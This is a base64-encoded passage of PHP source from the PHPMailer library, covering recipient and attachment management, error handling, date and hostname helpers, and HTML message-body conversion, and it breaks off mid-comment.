AgICogQ2hlY2sgaWYgYW4gYXR0YWNobWVudCAobm9uLWlubGluZSkgaXMgcHJlc2VudC4KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYXR0YWNobWVudEV4aXN0cygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsKICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICdhdHRhY2htZW50JykgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgaWYgdGhpcyBtZXNzYWdlIGhhcyBhbiBhbHRlcm5hdGl2ZSBib2R5IHNldC4KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWx0ZXJuYXRpdmVFeGlzdHMoKQogICAgewogICAgICAgIHJldHVybiAhZW1wdHkoJHRoaXMtPkFsdEJvZHkpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgcXVldWVkIGFkZHJlc3NlcyBvZiBnaXZlbiBraW5kLgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtpbmQgJ3RvJywgJ2NjJywgb3IgJ2JjYycKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJRdWV1ZWRBZGRyZXNzZXMoJGtpbmQpCiAgICB7CiAgICAgICAgJFJlY2lwaWVudHNRdWV1ZSA9ICR0aGlzLT5SZWNpcGllbnRzUXVldWU7CiAgICAgICAgZm9yZWFjaCAoJFJlY2lwaWVudHNRdWV1ZSBhcyAkYWRkcmVzcyA9PiAkcGFyYW1zKSB7CiAgICAgICAgICAgIGlmICgkcGFyYW1zWzBdID09ICRraW5kKSB7CiAgICAgICAgICAgICAgICB1bnNldCgkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgVG8gcmVjaXBpZW50cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBZGRyZXNzZXMoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG8pIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJHRvWzBdKV0pOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+dG8gPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygndG8nKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBDQyByZWNpcGllbnRzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckNDcygpCiAgICB7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmNjIGFzICRjYykgewogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkY2NbMF0pXSk7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5jYyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCdjYycpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIEJDQyByZWNpcGllbnRzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckJDQ3MoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5iY2MgYXMgJGJjYykgewogICAgICAgICAgICB1bnNldCgkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkYmNjWzBdKV0pOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+YmNjID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ2JjYycpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIFJlcGx5VG8gcmVjaXBpZW50cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJSZXBseVRvcygpCiAgICB7CiAgICAgICAgJHRoaXMtPlJlcGx5VG8gPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5SZXBseVRvUXVldWUgPSBhcnJheSgpOwogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIHJlY2lwaWVudCB0eXBlcy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBbGxSZWNpcGllbnRzKCkKICAgIHsKICAgICAgICAkdGhpcy0+dG8gPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5jYyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPmJjYyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlID0gYXJyYXkoKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBmaWxlc3lzdGVtLCBzdHJpbmcsIGFuZCBiaW5hcnkgYXR0YWNobWVudHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQXR0YWNobWVudHMoKQogICAgewogICAgICAgICR0aGlzLT5hdHRhY2htZW50ID0gYXJyYXkoKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBjdXN0b20gaGVhZGVycy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJDdXN0b21IZWFkZXJzKCkKICAgIHsKICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyID0gYXJyYXkoKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBlcnJvciBtZXNzYWdlIHRvIHRoZSBlcnJvciBjb250YWluZXIuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAkbXNnCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNldEVycm9yKCRtc2cpCiAgICB7CiAgICAgICAgJHRoaXMtPmVycm9yX2NvdW50Kys7CiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3NtdHAnIGFuZCAhaXNfbnVsbCgkdGhpcy0+c210cCkpIHsKICAgICAgICAgICAgJGxhc3RlcnJvciA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOwogICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ2Vycm9yJ10pKSB7CiAgICAgICAgICAgICAgICAkbXNnIC49ICR0aGlzLT5sYW5nKCdzbXRwX2Vycm9yJykgLiAkbGFzdGVycm9yWydlcnJvciddOwogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydkZXRhaWwnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgRGV0YWlsOiAnLiAkbGFzdGVycm9yWydkZXRhaWwnXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnc210cF9jb2RlJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIFNNVFAgY29kZTogJyAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZSddOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGVfZXgnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgQWRkaXRpb25hbCBTTVRQIGluZm86ICcgLiAkbGFzdGVycm9yWydzbXRwX2NvZGVfZXgnXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkdGhpcy0+RXJyb3JJbmZvID0gJG1zZzsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiBhbiBSRkMgODIyIGZvcm1hdHRlZCBkYXRlLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcmZjRGF0ZSgpCiAgICB7CiAgICAgICAgLy8gU2V0IHRoZSB0aW1lIHpvbmUgdG8gd2hhdGV2ZXIgdGhlIGRlZmF1bHQgaXMgdG8gYXZvaWQgNTAwIGVycm9ycwogICAgICAgIC8vIFdpbGwgZGVmYXVsdCB0byBVVEMgaWYgaXQncyBub3Qgc2V0IHByb3Blcmx5IGluIHBocC5pbmkKICAgICAgICBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KEBkYXRlX2RlZmF1bHRfdGltZXpvbmVfZ2V0KCkpOwogICAgICAgIHJldHVybiBkYXRlKCdELCBqIE0gWSBIOmk6cyBPJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgdGhlIHNlcnZlciBob3N0bmFtZS4KICAgICAqIFJldHVybnMgJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbicgaWYgdW5rbm93bi4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VydmVySG9zdG5hbWUoKQogICAgewogICAgICAgICRyZXN1bHQgPSAnbG9jYWxob3N0LmxvY2FsZG9tYWluJzsKICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5Ib3N0bmFtZSkpIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5Ib3N0bmFtZTsKICAgICAgICB9IGVsc2VpZiAoaXNzZXQoJF9TRVJWRVIpIGFuZCBhcnJheV9rZXlfZXhpc3RzKCdTRVJWRVJfTkFNRScsICRfU0VSVkVSKSBhbmQgIWVtcHR5KCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKSkgewogICAgICAgICAgICAkcmVzdWx0ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZ2V0aG9zdG5hbWUnKSAmJiBnZXRob3N0bmFtZSgpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkcmVzdWx0ID0gZ2V0aG9zdG5hbWUoKTsKICAgICAgICB9IGVsc2VpZiAocGhwX3VuYW1lKCduJykgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBwaHBfdW5hbWUoJ24nKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgYW4gZXJyb3IgbWVzc2FnZSBpbiB0aGUgY3VycmVudCBsYW5ndWFnZS4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBsYW5nKCRrZXkpCiAgICB7CiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5sYW5ndWFnZSkgPCAxKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRMYW5ndWFnZSgnZW4nKTsgLy8gc2V0IHRoZSBkZWZhdWx0IGxhbmd1YWdlCiAgICAgICAgfQoKICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygka2V5LCAkdGhpcy0+bGFuZ3VhZ2UpKSB7CiAgICAgICAgICAgIGlmICgka2V5ID09ICdzbXRwX2Nvbm5lY3RfZmFpbGVkJykgewogICAgICAgICAgICAgICAgLy9JbmNsdWRlIGEgbGluayB0byB0cm91Ymxlc2hvb3RpbmcgZG9jcyBvbiBTTVRQIGNvbm5lY3Rpb24gZmFpbHVyZQogICAgICAgICAgICAgICAgLy90aGlzIGlzIGJ5IGZhciB0aGUgYmlnZ2VzdCBjYXVzZSBvZiBzdXBwb3J0IHF1ZXN0aW9ucwogICAgICAgICAgICAgICAgLy9idXQgaXQncyB1c3VhbGx5IG5vdCBQSFBNYWlsZXIncyBmYXVsdC4KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2VbJGtleV0gLiAnIGh0dHBzOi8vZ2l0aHViLmNvbS9QSFBNYWlsZXIvUEhQTWFpbGVyL3dpa2kvVHJvdWJsZXNob290aW5nJzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vUmV0dXJuIHRoZSBrZXkgYXMgYSBmYWxsYmFjawogICAgICAgICAgICByZXR1cm4gJGtleTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayBpZiBhbiBlcnJvciBvY2N1cnJlZC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gVHJ1ZSBpZiBhbiBlcnJvciBkaWQgb2NjdXIuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc0Vycm9yKCkKICAgIHsKICAgICAgICByZXR1cm4gKCR0aGlzLT5lcnJvcl9jb3VudCA+IDApOwogICAgfQoKICAgIC8qKgogICAgICogRW5zdXJlIGNvbnNpc3RlbnQgbGluZSBlbmRpbmdzIGluIGEgc3RyaW5nLgogICAgICogQ2hhbmdlcyBldmVyeSBlbmQgb2YgbGluZSBmcm9tIENSTEYsIENSIG9yIExGIHRvICR0aGlzLT5MRS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgU3RyaW5nIHRvIGZpeEVPTAogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGZpeEVPTCgkc3RyKQogICAgewogICAgICAgIC8vIE5vcm1hbGlzZSB0byBcbgogICAgICAgICRuc3RyID0gc3RyX3JlcGxhY2UoYXJyYXkoIlxyXG4iLCAiXHIiKSwgIlxuIiwgJHN0cik7CiAgICAgICAgLy8gTm93IGNvbnZlcnQgTEUgYXMgbmVlZGVkCiAgICAgICAgaWYgKCR0aGlzLT5MRSAhPT0gIlxuIikgewogICAgICAgICAgICAkbnN0ciA9IHN0cl9yZXBsYWNlKCJcbiIsICR0aGlzLT5MRSwgJG5zdHIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJG5zdHI7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSBjdXN0b20gaGVhZGVyLgogICAgICogJG5hbWUgdmFsdWUgY2FuIGJlIG92ZXJsb2FkZWQgdG8gY29udGFpbgogICAgICogYm90aCBoZWFkZXIgbmFtZSBhbmQgdmFsdWUgKG5hbWU6dmFsdWUpCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBDdXN0b20gaGVhZGVyIG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlIEhlYWRlciB2YWx1ZQogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRDdXN0b21IZWFkZXIoJG5hbWUsICR2YWx1ZSA9IG51bGwpCiAgICB7CiAgICAgICAgaWYgKCR2YWx1ZSA9PT0gbnVsbCkgewogICAgICAgICAgICAvLyBWYWx1ZSBwYXNzZWQgaW4gYXMgbmFtZTp2YWx1ZQogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBleHBsb2RlKCc6JywgJG5hbWUsIDIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXJbXSA9IGFycmF5KCRuYW1lLCAkdmFsdWUpOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybnMgYWxsIGN1c3RvbSBoZWFkZXJzLgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q3VzdG9tSGVhZGVycygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5DdXN0b21IZWFkZXI7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgYSBtZXNzYWdlIGJvZHkgZnJvbSBhbiBIVE1MIHN0cmluZy4KICAgICAqIEF1dG9tYXRpY2FsbHkgaW5saW5lcyBpbWFnZXMgYW5kIGNyZWF0ZXMgYSBwbGFpbi10ZXh0IHZlcnNpb24gYnkgY29udmVydGluZyB0aGUgSFRNTCwKICAgICAqIG92ZXJ3cml0aW5nIGFueSBleGlzdGluZyB2YWx1ZXMgaW4gQm9keSBhbmQgQWx0Qm9keS4KICAgICAqIERvIG5vdCBzb3VyY2UgJG1lc3NhZ2UgY29udGVudCBmcm9tIHVzZXIgaW5wdXQhCiAgICAgKiAkYmFzZWRpciBpcyBwcmVwZW5kZWQgd2hlbiBoYW5kbGluZyByZWxhdGl2ZSBVUkxzLCBlLmcuIDxpbWcgc3JjPSIvaW1hZ2VzL2EucG5nIj4gYW5kIG11c3Qgbm90IGJlIGVtcHR5CiAgICAgKiB3aWxsIGxvb2sgZm9yIGFuIGltYWdlIGZpbGUgaW4gJGJhc2VkaXIvaW1hZ2VzL2EucG5nIGFuZCBjb252ZXJ0IGl0IHRvIGlubGluZS4KICAgICAqIElmIHlvdSBkb24ndCBwcm92aWRlIGEgJGJhc2VkaXIsIHJlbGF0aXZlIHBhdGhzIHdpbGwgYmUgbGVmdCB1bnRvdWNoZWQgKGFuZCB0aHVzIHByb2JhYmx5IGJyZWFrIGluIGVtYWlsKQogICAgICogSWYgeW91IGRvbid0IHdhbnQgdG8gYXBwbHkgdGhlc2UgdHJhbnNmb3JtYXRpb25zIHRvIHlvdXIgSFRNTCwganVzdCBzZXQgQm9keSBhbmQgQWx0Qm9keSBkaXJlY3RseS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRtZXNzYWdlIEhUTUwgbWVzc2FnZSBzdHJpbmcKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJhc2VkaXIgQWJzb2x1dGUgcGF0aCB0byBhIGJhc2UgZGlyZWN0b3J5IHRvIHByZXBlbmQgdG8gcmVsYXRpdmUgcGF0aHMgdG8gaW1hZ2VzCiAgICAgKiBAcGFyYW0gYm9vbGVhbnxjYWxsYWJsZSAkYWR2YW5jZWQgV2hldGhlciB0byB1c2UgdGhlIGludGVybmFsIEhUTUwgdG8gdGV4dCBjb252ZXJ0ZXIKICAgICAqICAgIG9yIHlvdXIgb3duIGN1c3RvbSBjb252ZXJ0ZXIgQHNlZSBQSFBNYWlsZXI6Omh0bWwydGV4dCgpCiAgICAgKiBAcmV0dXJuIHN0cmluZyAkbWVzc2FnZSBUaGUgdHJhbnNmb3JtZWQgbWVzc2FnZSBCb2R5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBtc2dIVE1MKCRtZXNzYWdlLCAkYmFzZWRpciA9ICcnLCAkYWR2YW5jZWQgPSBmYWxzZSkKICAgIHsKICAgICAgICBwcmVnX21hdGNoX2FsbCgnLyhzcmN8YmFja2dyb3VuZCk9WyJcJ10oLiopWyJcJ10vVWknLCAkbWVzc2FnZSwgJGltYWdlcyk7CiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJGltYWdlcykpIHsKICAgICAgICAgICAgaWYgKHN0cmxlbigkYmFzZWRpcikgPiAxICYmIHN1YnN0cigkYmFzZWRpciwgLTEpICE9ICcvJykgewogICAgICAgICAgICAgICAgLy8gRW5zdXJlICRiYXNlZGlyIGhhcyBhIHRyYWlsaW5nIC8KICAgICAgICAgICAgICAgICRiYXNlZGlyIC49ICcvJzsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3JlYWNoICgkaW1hZ2VzWzJdIGFzICRpbWdpbmRleCA9PiAkdXJsKSB7CiAgICAgICAgICAgICAgICAvLyBDb252ZXJ0IGRhdGEgVVJJcyBpbnRvIGVtYmVkZGVkIGltYWdlcwogICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJyNeZGF0YTooaW1hZ2VbXjssXSopKDtiYXNlNjQpPywjJywgJHVybCwgJG1hdGNoKSkgewogICAgICAgICAgICAgICAgICAgICRkYXRhID0gc3Vic3RyKCR1cmwsIHN0cnBvcygkdXJsLCAnLCcpKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJG1hdGNoWzJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gYmFzZTY0X2RlY29kZSgkZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSByYXd1cmxkZWNvZGUoJGRhdGEpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vIFJGQzIzOTIgUyAyCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRTdHJpbmdFbWJlZGRlZEltYWdlKCRkYXRhLCAkY2lkLCAnZW1iZWQnIC4gJGltZ2luZGV4LCAnYmFzZTY0JywgJG1hdGNoWzFdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9IHN0cl9yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1swXVskaW1naW5kZXhdLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAgICAgLy8gT25seSBwcm9jZXNzIHJlbGF0aXZlIFVSTHMgaWYgYSBiYXNlZGlyIGlzIHByb3ZpZGVkIChpLmUuIG5vIGFic29sdXRlIGxvY2FsIHBhdGhzKQogICAgICAgICAgICAgICAgICAgICFlbXB0eSgkYmFzZWRpcikKICAgICAgICAgICAgICAgICAgICAvLyBJZ25vcmUgVVJMcyBjb250YWluaW5nIHBhcmVudCBkaXIgdHJhdmVyc2FsICguLikKICAgICAgICAgICAgICAgICAgICAmJiAoc3RycG9zKCR1cmwsICcuLicpID09PSBmYWxzZSkKICAgICAgICAgICAgICAgICAgICAvLyBEbyBub3QgY2hhbmdlIHVybHMgdGhhdCBhcmUgYWxyZWFkeSBpbmxpbmUgaW1hZ2VzCiAgICAgICAgICAgICAgICAgICAgJiYgc3Vic3RyKCR1cmwsIDAsIDQpICE9PSAnY2lkOicKICAgICAgICAgICAgICAgICAgICAvLyBEbyBub3QgY2hhbmdlIGFic29sdXRlIFVSTHMsIGluY2x1ZGluZyBhbm9ueW1vdXMgcHJvdG9jb2wKICAgICAgICAgICAgICAgICAgICAmJiAhcHJlZ19tYXRjaCgnI15bYS16XVthLXowLTkrLi1dKjo/Ly8jaScsICR1cmwpCiAgICAgICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkdXJsKTsKICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5ID0gZGlybmFtZSgkdXJsKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJGRpcmVjdG9yeSA9PSAnLicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSA9ICcnOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vIFJGQzIzOTIgUyAyCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkZGlyZWN0b3J5KSA+IDEgJiYgc3Vic3RyKCRkaXJlY3RvcnksIC0xKSAhPSAnLycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSAuPSAnLyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+YWRkRW1iZWRkZWRJbWFnZSgKICAgICAgICAgICAgICAgICAgICAgICAgJGJhc2VkaXIgLiAkZGlyZWN0b3J5IC4gJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAkY2lkLAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZW5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICdiYXNlNjQnLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmOjpfbWltZV90eXBlcygoc3RyaW5nKXNlbGY6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSkKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gcHJlZ19yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJy8nIC4gJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz1bIlwnXScgLiBwcmVnX3F1b3RlKCR1cmwsICcvJykgLiAnWyJcJ10vVWknLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHRoaXMtPmlzSFRNTCh0cnVlKTsKICAgICAgICAvLyBDb252ZXJ0IGFsbCBtZXNzYWdlIGJvZHkgbGluZSBicmVha3MgdG8gQ1JMRiwgbWFrZXMgcXVvdGVkLXByaW50YWJsZSBlbmNvZGluZyB3b3JrIG11Y2ggYmV0dGVyCiAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+bm9ybWFsaXplQnJlYWtzKCRtZXNzYWdlKTsKICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT5ub3JtYWxpemVCcmVha3MoJHRoaXMtPmh0bWwydGV4dCgkbWVzc2FnZSwgJGFkdmFuY2VkKSk7CiAgICAgICAgaWYgKCEkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgewogICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICdUbyB2aWV3IHRoaXMgZW1haWwgbWVzc2FnZSwgb3BlbiBpdCBpbiBhIHByb2dyYW0gdGhhdCB1bmRlcnN0YW5kcyBIVE1MIScgLgogICAgICAgICAgICAgICAgc2VsZjo6Q1JMRiAuIHNlbGY6OkNSTEY7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGhpcy0+Qm9keTsKICAgIH0KCiAgICAvKioKICAgICAqIENvbnZlcnQgYW4gSFRNTCBzdHJpbmcgaW50byBwbGFpbiB0ZXh0LgogICAgICogVGhpcyBpcyB1c2VkIGJ5IG1zZ0hUTUwoKS4KICAgICAqIE5vdGUgLSBvbGRlciB2ZXJzaW9ucyBvZiB0aGlzIGZ1bmN0aW9uIHVzZWQgYSBidW5kbGVkIGFkdmFuY2VkIGNvbnZlcnRlcgogICAgICogd2hpY2ggd2FzIGJlZW4gcmVtb3ZlZCBmb3IgbGljZW5zZSByZWFzb25zIGluICMyMzIuCiAgICAgKiBFeGFtcGxlIHVzYWdlOgogICAgICogPGNvZGU+CiAgICAgKiAvLyBVc2UgZGVmYXVsdCBjb252ZXJzaW9uCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sKTsKICAgICAqIC8vIFVzZSB5b3VyIG93biBjdXN0b20gY29udmVydGVyCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sLCBmdW5jdGlvbigkaHRtbCkgewogICAgICogICAgICRjb252ZXJ0ZXIgPSBuZXcgTXlIdG1sMnRleHQoJGh0bWwpOwogICAgICogICAgIHJldHVybiAkY29udmVydGVyLT5nZXRfdGV4dCgpOwogICAgICogfSk7CiAgICAgKiA8L2NvZGU+CiAgICAgKiBAcGFyYW0gc3RyaW5nICRodG1sIFRoZSBIVE1MIHRleHQgdG8gY29udmVydAogICAgICogQHBhcmFtIGJvb2xlYW58Y2FsbGFibGUgJGFkdmFuY2VkIEFueSBib29sZWFuIHZhbHVlIHRvIHVzZSB0aGUgaW50ZXJuYWwgY29udmVydGVyLAogICAgICogICBvciBwcm